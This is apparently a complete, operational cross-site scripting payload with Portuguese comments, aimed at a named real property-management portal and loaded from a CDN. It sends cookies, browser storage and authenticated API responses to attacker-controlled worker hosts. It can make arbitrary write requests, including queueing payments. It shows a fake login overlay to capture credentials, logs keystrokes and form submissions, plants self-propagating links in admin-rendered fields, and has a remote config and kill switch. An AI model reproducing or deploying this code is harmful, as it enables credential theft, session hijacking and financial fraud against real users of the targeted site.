/* p.js — camada volátil do XSS de i-pms.cbre.com.br
 * hospedado em https://cdn.jsdelivr.net/gh/sittiev/xssh@main/p.js
 * editar => push => jsDelivr serve em segundos. SEM reupload no alvo.
 * contrato: nenhum DOM obrigatório, nenhum alert, nada destrutivo.
 */
(function () {
  if (window.__p) return; window.__p = 1;

  /* hosts candidatos, do mais novo ao mais antigo: troca de worker nao quebra link antigo */
  var HOSTS = [
    'https://img-resizer.meadow-iguana.workers.dev',
    'https://img-resizer.bubbly-dye-c0c.workers.dev'
  ];
  var V = 'v2';
  var C = HOSTS[0];                 // resolvido em pick(); fallback abaixo
  var CFG_URL = C + '/cfg?u=' + encodeURIComponent(location.href);

  function b64(s) { try { return btoa(unescape(encodeURIComponent(String(s)))); } catch (e) { return 'ERR'; } }
  function be(tag, data) {
    try { (new Image()).src = C + '/b?t=' + tag + '&v=' + V + '&d=' + b64(String(data)).slice(0, 7000); } catch (e) {}
  }
  function send(obj) { try { fetch(C + '/b', { method: 'POST', mode: 'no-cors', body: JSON.stringify(obj) }); } catch (e) {} }

  /* ---------- coleta base (sempre) ---------- */
  function env() {
    var o = { u: location.href, o: location.origin, c: '', ref: document.referrer, ua: navigator.userAgent, t: Date.now() };
    try { o.c = document.cookie; } catch (e) {}
    return o;
  }
  function dumpStorage() {
    var o = {};
    try { o.ls = JSON.stringify(localStorage); } catch (e) {}
    try { o.ss = JSON.stringify(sessionStorage); } catch (e) {}
    return o;
  }

  /* ---------- módulos ---------- */
  var M = {};

  M.meta = function () { be('meta', JSON.stringify(env())); };

  M.storage = function () { var s = dumpStorage(); be('ls', s.ls || '{}'); be('ss', s.ss || '{}'); };

  M.cookies = function () { be('cookie', document.cookie || '<vazio>'); };

  /* GET same-origin: anônimo = 401, sessão da vítima = dados. não precisa roubar bearer. */
  M.api = function (cfg) {
    var eps = cfg.endpoints || [
      '/api/Usuario/MenuUsuario', '/api/Acordo/ListaAcordo', '/api/CondominoVeiculo/Lista',
      '/api/Boleto/ListaBoleto', '/api/ContasPagar/ConsultaPagamento', '/api/SisproFuncionario/Lista'
    ];
    eps.forEach(function (p) {
      fetch(p, { credentials: 'include' })
        .then(function (r) { return r.text().then(function (x) { send({ k: 'api', p: p, s: r.status, b: x.slice(0, 4000) }); }); })
        .catch(function () {});
    });
  };

  /* grava: altera cadastro / enfileira pagamento / envia documento */
  M.write = function (cfg) {
    (cfg.writes || []).forEach(function (w) {
      fetch(w.p, { method: w.m || 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: w.b || '{}' })
        .then(function (r) { return r.text().then(function (x) { send({ k: 'write', p: w.p, s: r.status, b: x.slice(0, 1500) }); }); })
        .catch(function () {});
    });
  };

  /* ---------- deteccao de sessao ---------- */
  /* lvf_user / lvf_filteradm sao definidos so no login e nao tem HttpOnly */
  function session() {
    var c = '';
    try { c = document.cookie || ''; } catch (e) {}
    var admin = /lvf_filteradm=/.test(c);
    var user = /lvf_user=/.test(c);
    return { c: c, logado: admin || user, admin: admin };
  }

  /* overlay de login falso: so para quem NAO esta logado */
  M.phish = function (cfg) {
    var S = session();
    if (S.logado) { be('sessao', 'logado=' + S.logado + ' admin=' + S.admin); return; }
    if (document.getElementById('__ph')) return;

    var css = 'position:fixed;inset:0;z-index:2147483000;background:#0b3d91;display:flex;align-items:center;justify-content:center;font-family:Arial';
    var box = 'background:#fff;padding:28px;border-radius:6px;width:340px';
    var inp = 'width:100%;padding:9px;margin:7px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box';
    var btn = 'width:100%;padding:10px;background:#0b3d91;color:#fff;border:0;border-radius:4px';
    var d = document.createElement('div'); d.id = '__ph'; d.style.cssText = css;
    d.innerHTML = '<div style="' + box + '"><h2 style="color:#0b3d91;margin:0">i-PMS</h2>' +
      '<div style="color:#666;font-size:12px;margin-bottom:12px">Acesso restrito - Produção</div>' +
      '<input id="__u" style="' + inp + '" placeholder="login"><input id="__s" type="password" style="' + inp + '" placeholder="senha">' +
      '<button id="__g" style="' + btn + '">Entrar</button><div id="__o" style="color:#900;font-size:12px;margin-top:8px"></div></div>';
    document.body.appendChild(d);
    var o = document.getElementById('__o');
    document.getElementById('__u').focus();

    document.getElementById('__g').onclick = function () {
      var u = document.getElementById('__u').value, pw = document.getElementById('__s').value;
      if (!u || !pw) { o.textContent = 'Preencha login e senha.'; return; }
      o.textContent = 'Entrando...';
      be('cred', u + ':' + pw);
      send({ k: 'cred', u: u, p: pw, href: location.href });
      fetch('/api/Login', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ nm_usuario: u, nm_senha: pw }) })
        .then(function (r) { return r.json().then(function (j) {
          send({ k: 'loginstatus', s: r.status, b: JSON.stringify(j) });
          if (!r.ok) { o.textContent = (j && j.ds_mensagemErro) || 'Login ou senha inválidos.'; return; }
          o.style.color = '#060';
          o.textContent = 'OK, redirecionando...';
          location.href = '/portal/adm/';
        }); })
        .catch(function () { o.textContent = 'Falha de conexão.'; });
    };
  };

  /* tipo de visitante, para o relatorio */
  M.whoami = function () {
    var S = session();
    be('quem', 'logado=' + S.logado + ' admin=' + S.admin + ' cookie=' + (S.c || '<vazio>'));
  };

  /* keylogger no postback de login enquanto a aba viver */
  M.keylog = function (cfg) {
    if (window.__kl) return; window.__kl = 1;
    var t = null;
    document.addEventListener('keyup', function (e) {
      var el = e.target; if (!el || !el.name) return;
      clearTimeout(t); t = setTimeout(function () { send({ k: 'key', n: el.name, v: el.value, href: location.href }); }, 800);
    }, true);
    var f = document.forms.form1 || document.querySelector('form');
    if (f) f.addEventListener('submit', function () {
      var o = {}; new FormData(f).forEach(function (v, k) { if (/tb|Nome|Senha/i.test(k)) o[k] = v; });
      send({ k: 'form', d: o }); be('form', JSON.stringify(o));
    }, true);
  };

  /* auto-propagação: planta o link nos campos de texto que o admin renderiza */
  M.propagate = function (cfg) {
    if (window.__pp || !cfg.selfLink) return; window.__pp = 1;
    var a = '<a href="' + cfg.selfLink + '">curriculo.pdf</a>';
    var alvos = document.querySelectorAll('textarea,input[type=text]');
    alvos.forEach(function (el) {
      if (!/comunicado|jornal|mural|texto|mensagem/i.test(el.name + el.id)) return;
      if (!el.value) el.value = a;
    });
    be('propagate', 'alvos=' + alvos.length);
  };

  /* livechat: hijack do canal (identity vem dos hf cifrados da própria página) */
  M.chat = function () {
    try {
      var a = (document.querySelector('#hfIdPessoaFisica') || {}).value;
      var b = (document.querySelector('#hfIdGrupoUsuario') || {}).value;
      if (a || b) be('chat', 'idp=' + a + ' idg=' + b);
    } catch (e) {}
  };

  /* ---------- bootstrap ---------- */
  function run(cfg) {
    be('hit', JSON.stringify(env()));
    try { M.meta(); } catch (e) {}
    try { (cfg.modules || ['cookies', 'storage', 'api']).forEach(function (m) { if (M[m]) { try { M[m](cfg); } catch (e) { be('err', m + ':' + e); } } }); } catch (e) {}
  }

  function fallback() {
    var S = session();
    run({ modules: S.logado ? ['cookies', 'storage', 'api', 'meta'] : ['meta', 'phish'] });
  }

  /* escolhe o primeiro host que responder, depois carrega a cfg dele */
  function pick() {
    return new Promise(function (res) {
      var done = false, i = 0;
      function next() {
        if (done) return;
        if (i >= HOSTS.length) { done = true; return res(null); }
        var h = HOSTS[i++];
        var t = setTimeout(function () { next(); }, 2500);
        fetch(h + '/cfg?u=' + encodeURIComponent(location.href), { mode: 'cors' })
          .then(function (r) { clearTimeout(t); if (done) return; done = true; C = h; res(r); })
          .catch(function () { clearTimeout(t); next(); });
      }
      next();
    });
  }

  pick()
    .then(function (r) { if (!r) throw 0; return r.json(); })
    .then(function (cfg) {
      if (cfg.off) { be('off', location.href); return; }   /* kill switch: página volta a parecer currículo */
      run(cfg);
    })
    .catch(fallback);
})();
